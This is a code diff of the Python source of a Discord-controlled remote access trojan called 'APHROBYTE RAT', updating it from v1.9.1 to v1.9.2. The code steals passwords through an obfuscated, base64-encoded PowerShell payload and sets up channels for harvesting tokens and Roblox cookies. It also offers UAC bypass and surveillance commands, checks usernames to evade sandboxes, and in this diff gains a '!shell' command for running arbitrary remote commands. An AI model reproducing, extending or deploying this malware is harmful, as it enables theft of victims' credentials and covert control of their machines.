@@ -1,5 +1,6 @@
-import pyautogui, cv2, time, threading, discord, requests, os, json, psutil, ctypes, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil
+import pyautogui, cv2, time, threading, win32api, discord, requests, os, json, psutil, ctypes, rotatescreen as rs, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil
 from discord.ext import commands
+from PIL import Image
 from ctypes import Structure, windll, c_uint, sizeof, byref
 
 client = commands.Bot(command_prefix='!',intents=discord.Intents.all())
@@ -13,13 +14,14 @@ annc_channel_id = "{announc}"
 pass_channel_id = "{passw}"
 tokens_channel_id = "{tokens}"
 roblosecurity_channel_id = "{roblosec}"
-clientid = ""
 autostart = True
+
+### CODE
+
+clientid = ""
 startup_enabled = False
 keylogger = ""
 cookies = ""
-
-### CODE
 
 installationpath = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
 
@@ -40,6 +42,7 @@ Available commands for **{os.getlogin()}** :
 **!usagelist** - Returns a list of active users.
 **!admin_check** - Checks if you are admin on target computer.
 **!bypass_uac** - Attempts to bypass UAC to get admin privileges.
+**!shell** - Run a shell command
 
 `-----SURVEILLANCE-----`
 
@@ -119,27 +122,10 @@ class LASTINPUTINFO(Structure):
         ('dwTime', c_uint)
     ]
 
-def shell(command):
-    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    global status
-    status = "ok"
-    return output.stdout.decode('CP437').strip()
-
-def shellcommand(command):
-    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    global status
-    status = "ok"
-    string = output.stdout.decode('CP437').strip()
-    f = open("shell.txt", "a")
-    r = open("shell.txt", "w")
-    r.write(string)
-
 def get_idle_duration():
-    lastInputInfo = LASTINPUTINFO()
-    lastInputInfo.cbSize = sizeof(lastInputInfo)
-    windll.user32.GetLastInputInfo(byref(lastInputInfo))
-    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
-    return millis / 100.0
+    idle_time = win32api.GetTickCount() - win32api.GetLastInputInfo()
+    idle_time /= 1000
+    return idle_time
 
 def takeScreenshot():
     temp = os.getenv('temp')
@@ -188,7 +174,7 @@ async def on_ready():
     await channel.send(f"""
 ||@everyone|| The RAT has sniped :flag_{cflag.lower()}: **{user}** :flag_{cflag.lower()}: with desktop ID **{host_id}**.
 
-``` APHROBYTE RAT v1.9.1 | {client.user.name} | RIOT ADMINISTRATION ```
+``` APHROBYTE RAT v1.9.2 | {client.user.name} | RIOT ADMINISTRATION ```
 
 :skull_crossbones: `->` IP Address : ||{ipaddress}|| <- :flag_{cflag.lower()}:
 :skull_crossbones: `->` Admin privileges : **{admincheck()}**
@@ -196,7 +182,7 @@ async def on_ready():
 :skull_crossbones: `->` OS : **{platform.system()} {platform.release()}**
 :skull_crossbones: `->` Usage ID : ||{clientid}||
 
-``` APHROBYTE RAT v1.9.1 | {client.user.name} | RIOT ADMINISTRATION ```
+``` APHROBYTE RAT v1.9.2 | {client.user.name} | RIOT ADMINISTRATION ```
 
 Help menu : **!help ||{clientid}||**
 Get list of active users : **!usagelist**
@@ -303,8 +289,11 @@ async def enabletaskmgr(ctx, *, usid):
 @client.command()
 async def idletime(ctx, *, usid):
     if usid == clientid:
-        idle_duration = str(get_idle_duration())
-        await ctx.send(f'Idletime for **{os.getlogin()}**: {idle_duration}')
+        idletime = get_idle_duration()
+        if idletime < 1:
+            await ctx.send(f"**{os.getlogin()}** isn't idle.")
+        elif idletime >= 1:
+            await ctx.send(f'Idletime for **{os.getlogin()}**: {str(idletime)}')
 
 @client.command()
 async def clipboard(ctx, *, usid):
@@ -327,12 +316,18 @@ async def clipboard(ctx, *, usid):
             user32.CloseClipboard()
         await ctx.send(f"Clipboard content for **{os.getlogin()}** is : \n\n" + str(body))
 
+def _shellpw(command):
+    output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    global status
+    status = "ok"
+    return output.stdout.decode('CP437').strip()
+
 @client.command()
 async def stealpasswords(ctx, *, usid):
     if usid == clientid:
         postchannel = client.get_channel(int(pass_channel_id))
         temp = os.getenv('temp')
-        passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
+        passwords = _shellpw("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
         f4 = open(temp + r"\passwords.txt", 'w')
         f4.write(str(passwords))
         f4.close()
@@ -458,7 +453,7 @@ async def messmouse(ctx, *, usid):
 
 @client.command()
 async def usagelist(ctx):
-    list_usage = f"Active : **{os.getlogin()}** with desktop ID **{socket.gethostname()}** and usage ID **{clientid}**. Admin privileges : **{admincheck()}** `v1.9.1`"
+    list_usage = f"Active : **{os.getlogin()}** with desktop ID **{socket.gethostname()}** and usage ID **{clientid}**. Admin privileges : **{admincheck()}** `v1.9.2`"
     await ctx.send(list_usage)
 
 @client.command()
@@ -927,6 +922,28 @@ async def showtaskbar(ctx, *, usid):
             ctypes.windll.user32.ShowWindow(h, 9)
             await ctx.send(f"**{os.getlogin()}**'s taskbar has been returned.")
         except: await ctx.send(f"**{os.getlogin()}**'s taskbar couldn't be returned.")
+
+@client.command()
+async def shell(ctx, usid, *, command=""):
+    if usid == clientid:
+        if command != "":
+            try:
+                output = os.popen(command).read()
+                if len(output) > 2000:
+                    temp_file = os.path.join(os.getenv('TEMP'), 'output.txt')
+                    with open(temp_file, 'w') as file:
+                        file.write(output)
+                    await ctx.send('Output is too long. Sending as a file.', file=discord.File(temp_file))
+                    os.remove(temp_file)
+                else:
+                    if output != "":
+                        await ctx.send(f'Shell output for **{os.getlogin()}**:\n```{output}```')
+                    else:
+                        await ctx.send(f'Output empty for **{os.getlogin()}**')
+            except Exception as e:
+                await ctx.send(f'An error occurred: {str(e)}')
+        else:
+            await ctx.send(f"Please input a shell command for **{os.getlogin()}**")
 
 def mainfunc():
     bluser = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
